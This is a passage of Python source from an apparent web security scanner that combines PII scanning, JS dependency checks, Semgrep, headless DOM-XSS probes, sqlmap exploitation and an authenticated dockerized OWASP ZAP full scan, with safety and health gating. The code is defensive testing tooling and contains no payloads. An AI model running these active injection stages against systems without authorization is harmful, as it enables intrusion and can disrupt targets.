    _pii += _pii_scan(_html, cookie, cap=300, structured_only=True)
    _pii_seen: set = set()
    for hit in _pii:
        k = (hit.entity, hit.masked, hit.url.split("?")[0])
        if k in _pii_seen:
            continue
        _pii_seen.add(k)
        findings.append(Finding(
            tool="pii", category="pii-disclosure", url=hit.url, param=hit.entity,
            evidence=f"{hit.entity} disclosed: {hit.masked} (confidence {hit.score})",
            verified=True))

    # 3) vulnerable JS dependencies
    for vl in vuln_libs:
        findings.append(Finding(tool="jsanalysis", category="vulnerable-component", url=vl.url,
                                param=vl.library, evidence=f"{vl.library} {vl.version}: {vl.detail}",
                                verified=True))

    # 3b) Semgrep JS static analysis: source->sink flows in code the runtime DOM pass never
    # triggers (belt-and-suspenders for DOM data-manipulation / XSS). No-op if semgrep absent.
    from .jsanalysis import run_semgrep_js
    for sg in run_semgrep_js(js_urls, cookie):
        findings.append(Finding(tool="semgrep", category=sg["category"], url=sg.get("path", ""),
                                param=sg.get("check"), method="static",
                                evidence=(sg.get("message") or "")[:120]))

    # 4) DOM-based (headless): DOM-XSS + DOM open-redirect on HTML pages. This injects via a
    #    headless browser (client-side), so it is skipped under passive-only (no attack traffic).
    if dom and policy.active_scan and not health.halted:
        html_pages = sorted({u.split("#")[0] for u in urls
                             if not u.split("?")[0].endswith((".js", ".css", ".png", ".jpg",
                                                              ".svg", ".ico", ".woff", ".map"))})
        # map discovered params per page for DOM source testing
        page_params: dict = {}
        for t in targets:
            page_params.setdefault(t.url.split("?")[0], set()).update(t.params)
        for pg in html_pages[:25]:
            for d in dom_probe(pg, cookie, params=sorted(page_params.get(pg, []))):
                findings.append(Finding(tool="dom", category=d.category, url=d.url,
                                        param=d.source, evidence=d.evidence, verified=True))

    # 5) DEEP sqlmap exploitation LAST — the slowest + most target-hostile stage. By now the
    #    full detection matrix (nuclei/roster/probes/passive/PII/DOM) is already captured, so
    #    if sqlmap stresses or kills a fragile target the rest of the results still stand.
    #    Health-gated per target: reduced depth under stress, halt on target death.
    if tools and policy.active_scan:
        _sql_targets = [t for t in active_targets if t.params]
        if _inject_cap:
            # stratified per-category spread (not the first N of a sorted, LFI-dominated list)
            _keep = set(_stratified_sample([t.url for t in _sql_targets], _inject_cap))
            _sql_targets = [t for t in _sql_targets if t.url in _keep]
        for t in _sql_targets:
            if health.check() >= 2:   # target unhealthy -> stop, keep everything already found
                break
            lvl = health.sqlmap_level(policy.sqlmap_level)
            findings += run_sqlmap(t, cookie, politeness=pol, policy=policy, level_override=lvl)

    # 6) ZAP independent crawl + scan — a SECOND engine as a cross-check / accuracy insurance
    #    (its own spider + active rules corroborate the native stack; disagreements flag gaps on
    #    either side). Runs LAST because it re-crawls the target (heaviest, most target-hostile),
    #    and only while the target is healthy — a dockerized full-scan, skipped cleanly if docker
    #    or the image is absent. Findings are tagged tool="zap" so the cross-check is auditable.
    zap_ran = False
    zap_note = "disabled"
    if zap and tools and policy.active_scan:
        if health.check() >= 2:
            zap_note = "skipped: target unhealthy"
        elif not zap_available():
            zap_note = "skipped: docker/zap-stable image not available"
        else:
            import tempfile as _tf
            try:
                _zap_to = int(os.environ.get("DASTNG_ZAP_TIMEOUT", "2400") or "2400")
                findings += run_zap(target, cookie, _tf.mkdtemp(prefix="dastng-zap-"),
                                    timeout=_zap_to)
                zap_ran = True
                zap_note = "ran"
            except Exception as exc:  # noqa: BLE001 - ZAP failure must not sink the scan
                zap_note = f"error: {exc}"

    # dedup by (category, path, param)
    seen: set = set(); uniq: list[Finding] = []
    for f in findings:
        k = (f.category, urlsplit(f.url).path, f.param)
        if k in seen:
            continue
        seen.add(k); uniq.append(f)
    return {
        "urls": urls, "targets": len(targets),
        "findings": [f.__dict__ for f in uniq],
        # surface what the safety policy constrained, so coverage caps are never silent
        "policy": {
            "name": policy.name,
            "active_scan": policy.active_scan,
            "fuzz_forms": policy.fuzz_forms,
            "skip_state_changing": policy.skip_state_changing,
            "state_changing_endpoints_skipped": skipped_state_changing,
            "sqlmap": f"level {policy.sqlmap_level} risk {policy.sqlmap_risk} "
                      f"technique {policy.sqlmap_technique}",
            "inject_cap": _inject_cap or None,   # per-param heavy-tool cap (None = unbounded)
        },
        # adaptive health: what the target-stress monitor observed + did (never a silent cap)
        "health": {
            "stage": health.stage,          # 0 full depth, 1 reduced (L3), 2 halted
            "halted": health.halted,
            "sqlmap_level_used": health.sqlmap_level(policy.sqlmap_level),
            "events": health.events,
        },
        # ZAP cross-check: whether the second engine ran, so the corroboration is auditable
        "zap": {"ran": zap_ran, "note": zap_note,
                "findings": sum(1 for f in uniq if f.tool == "zap")},
    }


# ----- ZAP (passive categories + generative active scan, dockerized) ----------

def zap_available() -> bool:
    """True if the dockerized ZAP can run (docker daemon up + zap-stable image pulled).
    Lets the mega scan include ZAP when present and cleanly skip it when not."""
    try:
        if subprocess.run(["docker", "info"], capture_output=True, timeout=15,
                          check=False).returncode != 0:
            return False
        img = subprocess.run(["docker", "images", "-q", "zaproxy/zap-stable"],
                             capture_output=True, text=True, timeout=15, check=False)
        return bool((img.stdout or "").strip())
    except Exception:  # noqa: BLE001 - any failure = not available
        return False


def run_zap(target: str, cookie: str, out_dir: str, timeout: int = 2400) -> list[Finding]:
    """OWASP ZAP full-scan via docker (authenticated, logout-excluded). Adds the passive
    categories (CSRF, cookie/session hygiene, CSP, headers) and a generative active scan that
    corroborates injection classes. Requires a running docker (colima) + the zaproxy image."""
    import os

    from .scoring.normalize import normalize_zap
    ck = cookie.replace("; ", ";")
    zopts = (
        "-config replacer.full_list(0).description=auth "
        "-config replacer.full_list(0).enabled=true "
        "-config replacer.full_list(0).matchtype=REQ_HEADER "
        "-config replacer.full_list(0).matchstr=Cookie "
        "-config replacer.full_list(0).regex=false "
        f"-config replacer.full_list(0).replacement={ck} "
        "-config globalexcludeurl.url_list.url(0).regex=.*logout.* "
        "-config globalexcludeurl.url_list.url(0).enabled=true "
        "-config anticsrf.tokens.token(0).name=user_token "
        "-config anticsrf.tokens.token(0).enabled=true"
    )
    os.makedirs(out_dir, exist_ok=True)
    args = ["docker", "run", "--rm", "-v", f"{os.path.abspath(out_dir)}:/zap/wrk/:rw",
            "zaproxy/zap-stable", "zap-full-scan.py", "-t", target,
            "-J", "zap.json", "-j", "-I", "-z", zopts]
    _run(args, timeout=timeout)
    report_path = os.path.join(out_dir, "zap.json")
    if not os.path.exists(report_path):
        return []
    with open(report_path, encoding="utf-8") as fh:
        report = json.load(fh)
    out: list[Finding] = []
    for n in normalize_zap(report):
        out.append(Finding(tool="zap", category=n.category, url=n.url, param=n.param,
                           evidence=n.raw.get("name", "")))
    return out
